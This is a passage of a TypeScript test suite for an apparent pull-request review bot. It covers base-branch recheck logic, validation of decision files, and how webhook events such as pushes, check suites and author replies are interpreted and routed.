  it("rechecks a PR whose own files the base advance moved", async () => {
    const h = harness();
    h.adapter.delta = [file({ filename: "src/app.ts", patch: "@@\n-x=1\n+x=2" })];
    const out = await runBaseAdvance(h.deps, { branch: "master", before: "b0", after: "b1" });
    expect(out.get(PR)?.action).toBe("recheck");
    expect(h.injected).toHaveLength(1);
  });

  it("skips PRs that target another branch", async () => {
    const h = harness();
    h.adapter.base_ref = "release-2";
    const out = await runBaseAdvance(h.deps, { branch: "master", before: "b0", after: "b1" });
    expect(out.size).toBe(0);
    expect(h.injected).toHaveLength(0);
  });
});

// ---- the decision file ----------------------------------------------------

describe("recheck decisions", () => {
  let root: string;
  let store: StateStore;
  let watcher: RecheckWatcher;

  beforeEach(() => {
    root = mkdtempSync(join(tmpdir(), "qcr-recheck-"));
    mkdirSync(join(root, "verdict"), { recursive: true });
    store = new StateStore(":memory:");
    store.upsertPr({
      number: PR,
      state: "tracked",
      head_sha: HEAD,
      title: "t",
      author: "alice",
      trigger_ts: null,
      stale_recheck: 0,
      migration_gate: 0,
    });
    store.recordReviewedHead(PR, { head_sha: OLD, verdict: "APPROVE", round_no: 1 });
    watcher = new RecheckWatcher({ cfg, store, verdictDir: join(root, "verdict"), log: () => {} });
  });
  afterEach(() => rmSync(root, { recursive: true, force: true }));

  const write = (body: unknown, name = recheckDecisionFile(PR, HEAD)): string => {
    writeFileSync(join(root, "verdict", name), JSON.stringify(body));
    return name;
  };
  const kinds = (): string[] =>
    (
      store.db.prepare("SELECT kind FROM events WHERE pr = ?").all(PR) as Array<{ kind: string }>
    ).map((e) => e.kind);

  // fs.watch fires before the session's write completes; an eager single read
  // would archive a valid uphold as "unparseable".
  it("retries a partially-written decision instead of archiving it as malformed", async () => {
    const name = recheckDecisionFile(PR, HEAD);
    const path = join(root, "verdict", name);
    writeFileSync(path, "");
    watcher = new RecheckWatcher({
      cfg,
      store,
      verdictDir: join(root, "verdict"),
      log: () => {},
      // The production partial-write policy: an empty file
      // that is still young is waited out, never archived as malformed.
    });
    setTimeout(
      () =>
        writeFileSync(
          path,
          JSON.stringify({ pr: PR, head_sha: HEAD, outcome: "uphold", reason: "late write" }),
        ),
      15,
    );
    await watcher.sweep();
    expect(kinds()).toContain("recheck_upheld");
    expect(kinds()).not.toContain("recheck_decision_malformed");
  });

  it("a decision that stays unparseable is still archived as malformed, loudly", async () => {
    const name = recheckDecisionFile(PR, HEAD);
    writeFileSync(join(root, "verdict", name), "{never valid");
    const logs: string[] = [];
    watcher = new RecheckWatcher({
      cfg,
      store,
      verdictDir: join(root, "verdict"),
      log: (m) => logs.push(m),
      // A short settle so the test does not wait out the production 3 s: the
      // file must still sit unchanged across several looks before it is
      // called malformed.
      partialWrite: { settleMs: 40, windowMs: 2_000, initialDelayMs: 5, maxDelayMs: 20 },
    });
    await watcher.sweep();
    expect(kinds()).toContain("recheck_decision_malformed");
    expect(logs.some((l) => l.includes("malformed"))).toBe(true);
  });

  it("upholds: nothing posted, nothing moved, the mark left where it was", async () => {
    write({ pr: PR, head_sha: HEAD, outcome: "uphold", reason: "one formatting commit" });
    await watcher.sweep();
    expect(store.getPr(PR)?.state).toBe("tracked");
    expect(store.reviewedHead(PR)?.head_sha).toBe(OLD);
    expect(kinds()).toContain("recheck_upheld");
  });

  // An explicit session uphold carries a withheld
  // approval to the examined head; a request_changes kills the mark outright.
  it("uphold carries the withheld-approval mark to the upheld head", async () => {
    store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
    write({ pr: PR, head_sha: HEAD, outcome: "uphold", reason: "resolution kept both sides" });
    await watcher.sweep();
    expect(store.approvalWithheld(PR)?.head_sha).toBe(HEAD);
    expect(kinds()).toContain("approval_withheld_carried");
  });

  it("request_changes clears the withheld mark — approval is off the table", async () => {
    store.recordApprovalWithheld(PR, { head_sha: OLD, ci_state: "red", reason: "red-ci" });
    write({ pr: PR, head_sha: HEAD, outcome: "request_changes", reason: "regression" });
    await watcher.sweep();
    expect(store.approvalWithheld(PR)).toBeUndefined();
  });

  it("moves APPROVE → REQUEST_CHANGES when the session found a regression", async () => {
    write({
      pr: PR,
      head_sha: HEAD,
      outcome: "request_changes",
      reason: "the reorder broke _BARE_URL_RE",
    });
    await watcher.sweep();
    expect(store.getPr(PR)?.state).toBe("awaiting_author");
    expect(kinds()).toContain("recheck_request_changes");
  });

  it.each(["APPROVE", "approve", "NEEDS_HUMAN", "escalate", ""])(
    "can never re-approve or park: outcome %s folds to uphold",
    async (outcome) => {
      write({ pr: PR, head_sha: HEAD, outcome });
      await watcher.sweep();
      expect(store.getPr(PR)?.state).toBe("tracked");
      expect(store.getPr(PR)?.state).not.toBe("awaiting_human");
      expect(kinds()).toContain("recheck_outcome_coerced");
      expect(kinds()).toContain("recheck_upheld");
      expect(kinds()).not.toContain("recheck_request_changes");
    },
  );

  it("folds an unknown outcome in the validator itself", () => {
    const parsed = validateRecheckDecision({ pr: PR, head_sha: HEAD, outcome: "APPROVE" });
    expect(parsed.decision?.outcome).toBe("uphold");
    expect(parsed.coerced).toBe("APPROVE");
  });

  it("quarantines a malformed file without moving the PR", async () => {
    writeFileSync(join(root, "verdict", recheckDecisionFile(PR, HEAD)), "{not json");
    await watcher.sweep();
    expect(store.getPr(PR)?.state).toBe("tracked");
    expect(kinds()).toContain("recheck_decision_malformed");
  });

  it("rejects a decision whose head does not match its filename", async () => {
    write({ pr: PR, head_sha: OLD, outcome: "request_changes" });
    await watcher.sweep();
    expect(store.getPr(PR)?.state).toBe("tracked");
    expect(kinds()).toContain("recheck_decision_rejected");
  });
});

// ---- the trigger wiring ---------------------------------------------------

const interpretDeps = {
  botLogin: cfg.github.bot_login,
  triggerLabel: cfg.github.trigger_label,
  reviewTeam: cfg.github.review_team,
  botCommentPr: () => undefined,
};

describe("webhook interpretation of the recheck triggers", () => {
  it("reads a completed check suite as CI evidence at a head", () => {
    const i = interpretEvent(
      "check_suite",
      "completed",
      { check_suite: { head_sha: HEAD, conclusion: "failure", pull_requests: [{ number: PR }] } },
      interpretDeps,
    );
    expect(i).toMatchObject({
      kind: "ci_completed",
      pr: PR,
      prs: [PR],
      head_sha: HEAD,
      conclusion: "failure",
    });
  });

  it("ignores a check suite that belongs to no PR", () => {
    const i = interpretEvent(
      "check_suite",
      "completed",
      { check_suite: { head_sha: HEAD, pull_requests: [] } },
      interpretDeps,
    );
    expect(i.kind).toBe("ignored");
  });

  it("reads a branch push as a base advance, and ignores tags and deletions", () => {
    expect(
      interpretEvent(
        "push",
        null,
        { ref: "refs/heads/master", before: "b0", after: "b1" },
        interpretDeps,
      ),
    ).toMatchObject({ kind: "base_advanced", branch: "master", before: "b0", after: "b1" });
    expect(
      interpretEvent(
        "push",
        null,
        { ref: "refs/tags/v1", before: "b0", after: "b1" },
        interpretDeps,
      ).kind,
    ).toBe("ignored");
    expect(
      interpretEvent(
        "push",
        null,
        { ref: "refs/heads/gone", before: "b0", after: "0".repeat(40), deleted: true },
        interpretDeps,
      ).kind,
    ).toBe("ignored");
  });

  it("routes an author reply to ping-pong only — never to a recheck handler", async () => {
    const store = new StateStore(":memory:");
    const seen: string[] = [];
    const reply: Interpretation = {
      kind: "author_reply",
      pr: PR,
      comment_id: 9,
      in_reply_to_id: 8,
      body: "fixed",
      author: "alice",
      via: "thread_reply",
      scope: "review_comment",
    };
    await applyInterpretation(
      {
        cfg,
        store,
        onAuthorReply: () => void seen.push("pingpong"),
        onSynchronize: () => void seen.push("recheck:push"),
        onCiCompleted: () => void seen.push("recheck:ci"),
        onBaseAdvanced: () => void seen.push("recheck:base"),
      },
      reply,
    );
    expect(seen).toEqual(["pingpong"]);
    store.close();
  });

  it("routes a push to the recheck, and still never queues a review", async () => {
    const store = new StateStore(":memory:");
    const seen: string[] = [];
    await applyInterpretation(
      {
        cfg,
        store,
        onPrTouched: () => void seen.push("dispatch"),
        onSynchronize: () => void seen.push("recheck:push"),
      },
      {
        kind: "synchronize",
        pr: PR,
        meta: { number: PR, title: "t", author: "alice", head_sha: HEAD },
      },
    );
    expect(seen).toEqual(["recheck:push"]);
    expect(store.getPr(PR)?.state).toBe("tracked");
    store.close();
  });
});
